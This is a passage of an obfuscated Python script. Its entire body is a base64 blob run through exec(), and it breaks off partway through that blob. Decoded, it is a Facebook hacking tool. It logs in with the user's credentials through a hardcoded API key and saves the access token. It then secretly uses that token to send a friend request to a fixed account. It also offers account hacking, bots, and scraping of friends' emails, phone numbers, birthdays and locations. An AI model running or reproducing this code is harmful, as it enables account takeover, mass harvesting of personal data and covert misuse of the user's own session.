# Aryan-Mfc Created This Tool
# Github : Aryan Mfc
#  Whatsapp : Red Hackers Army
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24KIyBjb2Rpbmc9dXRmLTgKIyBwYXNoYWt1bi5jb20KCiNJbXBvcnQgbW9kdWxlCmltcG9ydCBvcyxzeXMsdGltZSxkYXRldGltZSxyYW5kb20saGFzaGxpYixyZSx0aHJlYWRpbmcsanNvbixnZXRwYXNzLHVybGxpYixjb29raWVsaWIKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbAp0cnk6CglpbXBvcnQgbWVjaGFuaXplCmV4Y2VwdCBJbXBvcnRFcnJvcjoKCW9zLnN5c3RlbSgicGlwMiBpbnN0YWxsIG1lY2hhbml6ZSIpCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6Cglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCByZXF1ZXN0cyIpCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yCmZyb20gbWVjaGFuaXplIGltcG9ydCBCcm93c2VyCgojLVNldHRpbmctIwojIyMjIyMjIwpyZWxvYWQoc3lzKQpzeXMuc2V0ZGVmYXVsdGVuY29kaW5nKCd1dGY4JykKYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQpici5zZXRfaGFuZGxlX3JlZnJlc2gobWVjaGFuaXplLl9odHRwLkhUVFBSZWZyZXNoUHJvY2Vzc29yKCksbWF4X3RpbWU9MSkKYnIuYWRkaGVhZGVycyA9IFsoJ1VzZXItQWdlbnQnLCdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzMyLjAuMjI1NC84NS4gVTsgaWQpIFByZXN0by8yLjEyLjQyMyBWZXJzaW9uLzEyLjE2JyldCgojLUtlbHVhci0jCmRlZiBrZWx1YXIoKToKCXByaW50ICJcMDMzWzE7OTFtWyFdIEV4aXQiCglvcy5zeXMuZXhpdCgpCgkKIy1XYXJuYS0jCmRlZiBhY2FrKHgpOgogICAgdyA9ICdtaGticGNQJwogICAgZCA9ICcnCiAgICBmb3IgaSBpbiB4OgogICAgICAgIGQgKz0gJyEnK3dbcmFuZG9tLnJhbmRpbnQoMCxsZW4odyktMSldK2kKICAgIHJldHVybiBjZXRhayhkKQogICAgCmRlZiBjZXRhayh4KToKICAgIHcgPSAnbWhrYnBjUCcKICAgIGZvciBpIGluIHc6CiAgICAgICAgaiA9IHcuaW5kZXgoaSkKICAgICAgICB4PSB4LnJlcGxhY2UoJyElcyclaSwnXDAzM1slczsxbSclc3RyKDMxK2opKQogICAgeCArPSAnXDAzM1swbScKICAgIHggPSB4LnJlcGxhY2UoJyEwJywnXDAzM1swbScpCiAgICBzeXMuc3Rkb3V0LndyaXRlKHgrJ1xuJykKCQojLUFuaW1hc2ktIwpkZWYgamFsYW4oeik6Cglmb3IgZSBpbiB6ICsgJ1xuJzoKCQlzeXMuc3Rkb3V0LndyaXRlKGUpCgkJc3lzLnN0ZG91dC5mbHVzaCgpCgkJdGltZS5zbGVlcCgwMDAwMC4xKQoJCQojIyMjIyBMT0dPICMjIyMjCmxvZ28gPSAiIiJcMDMzWzE7MzBt4paI4paI4paI4paI4paI4paI4paI4paI4paIClwwMzNbMTszMG3ilojiloTilojilojilojilojilojiloTiloggICAgICBcMDMzWzE7OTFt4peP4pas4pas4pas4pas4pas4pas4pas4pas4pas4LmR26nbqeC5keKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKXjwpcMDMzWzE7MzBt4paIXDAzM1sxOzkybeKWvOKWvOKWvOKWvOKWvCBcMDMzWzE7OTJtLSBfIC0tXy0tXDAzM1sxOzk1beKVlOKVpuKVl+KUjOKUgOKUkOKUrOKUgOKUkOKUrOKUjOKUgCAgIOKVlOKVkOKVl+KVlOKVlyAKXDAzM1sxOzMwbeKWiCBcMDMzWzE7OTJtIFwwMzNbMTs5Mm1fLV8tLSAtXyAtLV9fXDAzM1sxOzkzbSDilZHilZHilJzilIDilKTilJzilKzilJjilJzilLTilJDilIDilIDilIDilaDilaMg4pWg4pWp4pWXClwwMzNbMTszMG3ilohcMDMzWzE7OTJt4pay4pay4pay4pay4payXDAzM1sxOzkybS0tICAtIF8gLS1cMDMzWzE7OTZt4pWQ4pWp4pWd4pS0IOKUtOKUtOKUlOKUgOKUtCDilLQgICDilZogIOKVmuKVkOKVnSBcMDMzWzE7OTZtClwwMzNbMTszMG3ilojilojilojilojilojilojilojilojiloggICAgICBcMDMzWzE7OTJtwqstLS0tLS0tLS0t4pynLS0tLS0tLS0tLcK7ClwwMzNbMTszMG0g4paI4paIIOKWiOKWiApcMDMzWzE7MzFt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXClwwMzNbMTszMW3ilZFcMDMzWzE7MzJtKiBcMDMzWzE7OTNtQXV0aG9yICBcMDMzWzE7OTNtOiBcMDMzWzE7MzJtQXJ5YW4tTWZjICAgICAgICBcMDMzWzE7MzFtICAgICAgIOKVkQpcMDMzWzE7MzFt4pWRXDAzM1sxOzMybSogXDAzM1sxOzkzbVdoYXRzYXBwIFwwMzNbMTs5M206IFwwMzNbMTszNm05MTczNTYyNjg4MThcMDMzWzBtIFwwMzNbMTszMW0gICAgICAgICAgIOKVkQpcMDMzWzE7MzFt4pWRXDAzM1sxOzMybSogXDAzM1sxOzkzbUdpdEh1YiAgXDAzM1sxOzkzbTogXDAzM1sxOzM0bWh0dHBzOi8vZ2l0aHViLmNvbS9Bcnlhbi1NZmNcMDMzWzBtIFwwMzNbMTszMW0gICDilZEKXDAzM1sxOzMxbeKVkVwwMzNbMTszMm0qIFwwMzNbMTs5M21UZWFtICAgIFwwMzNbMTs5M206IFwwMzNbMTszNW1JTkRJQU4gQ1lCRVItRVJST1IgU1lTVEVNXDAzM1swbSBcMDMzWzE7MzFtICAg4pWRClwwMzNbMTszMW3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iIiIKCiMgdGl0aWsgIwpkZWYgdGlrKCk6Cgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KCWZvciBvIGluIHRpdGlrOgoJCXByaW50KCJcclwwMzNbMTs5MW1b4pePXSBcMDMzWzE7OTJtTG9hZGluZyBcMDMzWzE7OTdtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkKCmJhY2sgPSAwCnRocmVhZHMgPSBbXQpiZXJoYXNpbCA9IFtdCmNla3BvaW50ID0gW10Kb2tzID0gW10KZ2FnYWwgPSBbXQppZHRlbWFuID0gW10KaWRmcm9tdGVtYW4gPSBbXQppZG1lbSA9IFtdCmVtbWVtID0gW10Kbm9tZW0gPSBbXQppZCA9IFtdCmVtID0gW10KZW1mcm9tdGVtYW4gPSBbXQpocCA9IFtdCmhwZnJvbXRlbWFuID0gW10KcmVha3NpID0gW10KcmVha3NpZ3J1cCA9IFtdCmtvbWVuID0gW10Ka29tZW5ncnVwID0gW10KbGlzdGdydXAgPSBbXQp2dWxub3QgPSAiXDAzM1szMW1Ob3QgVnVsbiIKdnVsbiA9ICJcMDMzWzMybVZ1bG4iCgojIyMjIyBMSUNFTlNFICMjIyMjCiM9PT09PT09PT09PT09PT09PSMKZGVmIGxpc2Vuc2koKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJbWFzdWsoKQoKIyMjIyMgUGlsaWggTG9naW4gIyMjIyMKZGVmIG1hc3VrKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTFt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTVtMS5cMDMzWzE7MzJtIExvZ2luIE1vYmlsZS9FbWFpbCIKCXByaW50ICJcMDMzWzE7OTFt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTVtMi5cMDMzWzE7MzJtIExvZ2luIFVzaW5nIFRva2VuIgoJcHJpbnQgIlwwMzNbMTs5MW3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5NW0wLlwwMzNbMTszMW0gRXhpdCIKCXByaW50ICJcMDMzWzE7OTFt4pWRIgoJbXN1ayA9IHJhd19pbnB1dCgiXDAzM1sxOzk2beKVmuKVkFwwMzNbMTsxbUVudGVyIFwwMzNbMTs5M20iKQoJaWYgbXN1ayA9PSIiOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJa2VsdWFyKCkKCWVsaWYgbXN1ayA9PSIxIjoKCQlsb2dpbigpCgllbGlmIG1zdWsgPT0iMiI6CgkJdG9rZW56KCkKCWVsaWYgbXN1ayA9PSIwIjoKCQlrZWx1YXIoKQoJZWxzZToKCQlwcmludCJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWtlbHVhcigpCgkJCiMjIyMjIExPR0lOICMjIyMjCiM9PT09PT09PT09PT09PT09IwpkZWYgbG9naW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpCgkJbWVudSgpIAoJZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJcHJpbnQoJ1wwMzNbMTs5Nm1b4piGXSBcMDMzWzE7OTJtTE9HSU4gQUNDT1VOVCBGQUNFQk9PSyBcMDMzWzE7OTFtW+KYhl0nKQoJCWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTszNm1JRFwwMzNbMTs5N218XDAzM1sxOzk2bUVtYWlsXDAzM1sxOzk3bSBcMDMzWzE7OTFtOlwwMzNbMTs5Mm0gJykKCQlwd2QgPSBnZXRwYXNzLmdldHBhc3MoJ1wwMzNbMTs5NW1bK10gXDAzM1sxOzkzbVBhc3N3b3JkIFwwMzNbMTs5M206XDAzM1sxOzk1bSAnKQoJCXRpaygpCgkJdHJ5OgoJCQlici5vcGVuKCdodHRwczovL20uZmFjZWJvb2suY29tJykKCQlleGNlcHQgbWVjaGFuaXplLlVSTEVycm9yOgoJCQlwcmludCJcblwwMzNbMTs5MW1bIV0gTm8gY29ubmVjdGlvbiIKCQkJa2VsdWFyKCkKCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQoJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJYnIuZm9ybVsnZW1haWwnXSA9IGlkCgkJYnIuZm9ybVsncGFzcyddID0gcHdkCgkJYnIuc3VibWl0KCkKCQl1cmwgPSBici5nZXR1cmwoKQoJCWlmICdzYXZlLWRldmljZScgaW4gdXJsOgoJCQl0cnk6CgkJCQlzaWc9ICdhcGlfa2V5PTg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkY3JlZGVudGlhbHNfdHlwZT1wYXNzd29yZGVtYWlsPScraWQrJ2Zvcm1hdD1KU09OZ2VuZXJhdGVfbWFjaGluZV9pZD0xZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTFsb2NhbGU9ZW5fVVNtZXRob2Q9YXV0aC5sb2dpbnBhc3N3b3JkPScrcHdkKydyZXR1cm5fc3NsX3Jlc291cmNlcz0wdj0xLjA2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKCQkJCWRhdGEgPSB7ImFwaV9rZXkiOiI4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCIsImNyZWRlbnRpYWxzX3R5cGUiOiJwYXNzd29yZCIsImVtYWlsIjppZCwiZm9ybWF0IjoiSlNPTiIsICJnZW5lcmF0ZV9tYWNoaW5lX2lkIjoiMSIsImdlbmVyYXRlX3Nlc3Npb25fY29va2llcyI6IjEiLCJsb2NhbGUiOiJlbl9VUyIsIm1ldGhvZCI6ImF1dGgubG9naW4iLCJwYXNzd29yZCI6cHdkLCJyZXR1cm5fc3NsX3Jlc291cmNlcyI6IjAiLCJ2IjoiMS4wIn0KCQkJCXg9aGFzaGxpYi5uZXcoIm1kNSIpCgkJCQl4LnVwZGF0ZShzaWcpCgkJCQlhPXguaGV4ZGlnZXN0KCkKCQkJCWRhdGEudXBkYXRlKHsnc2lnJzphfSkKCQkJCXVybCA9ICJodHRwczovL2FwaS5mYWNlYm9vay5jb20vcmVzdHNlcnZlci5waHAiCgkJCQlyPXJlcXVlc3RzLmdldCh1cmwscGFyYW1zPWRhdGEpCgkJCQl6PWpzb24ubG9hZHMoci50ZXh0KQoJCQkJemVkZCA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykKCQkJCXplZGQud3JpdGUoelsnYWNjZXNzX3Rva2VuJ10pCgkJCQl6ZWRkLmNsb3NlKCkKCQkJCXByaW50ICdcblwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Mb2dpbiBzdWNjZXNzZnVsbHknCgkJCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP21ldGhvZD1wb3N0JnVpZHM9Z3dpbXVzYTMmYWNjZXNzX3Rva2VuPScrelsnYWNjZXNzX3Rva2VuJ10pCgkJCQlvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LnBhc2hha3VuLmNvbScpCgkJCQltZW51KCkKCQkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCQkJcHJpbnQiXG5cMDMzWzE7OTFtWyFdIE5vIGNvbm5lY3Rpb24iCgkJCQlrZWx1YXIoKQoJCWlmICdjaGVja3BvaW50JyBpbiB1cmw6CgkJCXByaW50KCJcblwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIpCgkJCXByaW50KCJcblwwMzNbMTs5Mm1bI10gSGFyYXAgTG9naW4gVWxhbmcgISIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJa2VsdWFyKCkKCQllbHNlOgoJCQlwcmludCgiXG5cMDMzWzE7OTFtWyFdIExvZ2luIEZhaWxlZCIpCgkJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJCXRpbWUuc2xlZXAoMSkKCQkJbG9naW4oKQoJCQkKIyMjIyMgVE9LRU4gIyMjIyMKZGVmIHRva2VueigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCgl0b2tldCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtVG9rZW5cMDMzWzE7OTFtIDogXDAzM1sxOzk3bSIpCgl0cnk6CgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkKCQluYW1hID0gYVsnbmFtZSddCgkJemVkZCA9IG9wZW4oImxvZ2luLnR4dCIsICd3JykKCQl6ZWRkLndyaXRlKHRva2V0KQoJCXplZGQuY2xvc2UoKQoJCW1lbnUoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIgoJCWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybVdhbnQgdG8gcGljayB1cCB0b2tlbj9cMDMzWzE7OTdtW3kvbl06ICIpCgkJaWYgZSA9PSIiOgoJCQlrZWx1YXIoKQoJCWVsaWYgZSA9PSJ5IjoKCQkJbG9naW4oKQoJCWVsc2U6CgkJCWtlbHVhcigpCgkJCQojIyMjIyBNRU5VICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpkZWYgbWVudSgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW90dyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpCgkJbmFtYSA9IGFbJ25hbWUnXQoJCWlkID0gYVsnaWQnXQoJZXhjZXB0IEtleUVycm9yOgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBObyBjb25uZWN0aW9uIgoJCWtlbHVhcigpCglvcy5zeXN0ZW0oInJlc2V0IikKCXByaW50IGxvZ28KCXByaW50ICLilZFcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXVwwMzNbMTs5N20gTmFtZSBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIituYW1hKyJcMDMzWzE7OTdtIgoJcHJpbnQgIuKVkVwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dXDAzM1sxOzk3bSBJRCAgIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK2lkCglwcmludCAiXDAzM1sxOzk3beKVmiIrNDAqIuKVkCIKCXByaW50ICJcMDMzWzE7OTRt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTNtMS5cMDMzWzE7OTVtIFVzZXIgaW5mb3JtYXRpb24iCglwcmludCAiXDAzM1sxOzk0beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkzbTIuXDAzM1sxOzk1bSBHZXQgSWQvZW1haWwvaHAiCglwcmludCAiXDAzM1sxOzk0beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkzbTMuXDAzM1sxOzk1bSBIYWNrIGZhY2Vib29rIGFjY291bnQgICAgICAgICAgICAgICAiCglwcmludCAiXDAzM1sxOzk0beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkzbTQuXDAzM1sxOzk1bSBCb3QgICAgICAgIgoJcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M201LlwwMzNbMTs5NW0gT3RoZXJzICAgICAgICAgICAiCglwcmludCAiXDAzM1sxOzk0beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkzbTYuXDAzM1sxOzk1bSBTaG93IHRva2VuICAgICAgICAgICAiCglwcmludCAiXDAzM1sxOzk0beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkzbTcuXDAzM1sxOzk1bSBEZWxldGUgdHJhc2ggICAgICAgICAgIgoJcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M204LlwwMzNbMTs5NW0gTG9nT3V0ICAgICAgICAgICAgIgoJcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M20wLlwwMzNbMTs5NW0gRXhpdCB0aGUgcHJvZ3JhbXMgICAgICAgICAgIgoJcHJpbnQgIuKVkSIKCXBpbGloKCkKIy0KZGVmIHBpbGloKCk6Cgl6ZWRkID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUVudGVyIFwwMzNbMTs5N20iKQoJaWYgemVkZCA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXBpbGloKCkKCWVsaWYgemVkZCA9PSIxIjoKCQlpbmZvcm1hc2koKQoJZWxpZiB6ZWRkID09IjIiOgoJCWR1bXAoKQoJZWxpZiB6ZWRkID09IjMiOgoJCW1lbnVfaGFjaygpCgllbGlmIHplZGQgPT0iNCI6CgkJbWVudV9ib3QoKQoJZWxpZiB6ZWRkID09IjUiOgoJCWxhaW4oKQoJZWxpZiB6ZWRkID09IjYiOgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCgkJcHJpbnQgIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVlvdXIgdG9rZW5cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrdG9rZXQKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnUoKQoJZWxpZiB6ZWRkID09IjciOgoJCW9zLnJlbW92ZSgnb3V0JykKCWVsaWYgemVkZCA9PSI4IjoKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCW9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8vOTE3MzU2MjY4ODE4JykKCQlrZWx1YXIoKQoJZWxpZiB6ZWRkID09IjAiOgoJCWtlbHVhcigpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXBpbGloKCkKCQojIyMjIyBJTkZPICMjIyMjCmRlZiBpbmZvcm1hc2koKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJYWlkID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1FbnRlciBJRFwwMzNbMTs5N20vXDAzM1sxOzkybU5hbWVcMDMzWzE7OTFtIDogXDAzM1sxOzk3bScpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1XYWl0IGEgbWludXRlIFwwMzNbMTs5N20uLi4nKQoJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCWNvayA9IGpzb24ubG9hZHMoci50ZXh0KQoJZm9yIGkgaW4gY29rWydkYXRhJ106CgkJaWYgYWlkIGluIGlbJ25hbWUnXSBvciBhaWQgaW4gaVsnaWQnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICAgICAgIDogJyt6WyduYW1lJ10KCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQl0cnk6CgkJCQlwcmludCAnXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20gICAgICAgICAgICA6ICcrelsnaWQnXQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20gICAgICAgICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bSAgICAgICAgIDogJyt6WydlbWFpbCddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bSAgICAgICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVGVsZXBob25lXDAzM1sxOzk3bSAgICAgOiAnK3pbJ21vYmlsZV9waG9uZSddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybVRlbGVwaG9uZVwwMzNbMTs5N20gICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtTG9jYXRpb25cMDMzWzE7OTdtICAgICAgOiAnK3pbJ2xvY2F0aW9uJ11bJ25hbWUnXQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1Mb2NhdGlvblwwMzNbMTs5N20gICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybURhdGUgb2YgYmlydGhcMDMzWzE7OTdtIDogJyt6WydiaXJ0aGRheSddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybURhdGUgb2YgYmlydGhcMDMzWzE7OTdtIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtU2Nob29sXDAzM1sxOzk3bSAgICAgICAgOiAnCgkJCQlmb3IgcSBpbiB6WydlZHVjYXRpb24nXToKCQkJCQl0cnk6CgkJCQkJCXByaW50ICdcMDMzWzE7OTFtICAgICAgICAgICAgICAgICAgIH4gXDAzM1sxOzk3bScrcVsnc2Nob29sJ11bJ25hbWUnXQoJCQkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW0gICAgICAgICAgICAgICAgICAgfiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQlleGNlcHQgS2V5RXJyb3I6IHBhc3MKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJbWVudSgpCgkJZWxzZToKCQkJcGFzcwoJZWxzZToKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gVXNlciBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51KCkKCQkKIyMjIyMgRFVNUCAjIyMjIwpkZWYgZHVtcCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBHZXQgSUQgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gR2V0IElEIGZyaWVuZCBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEdldCBJRCBTZWFyY2giCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuXDAzM1s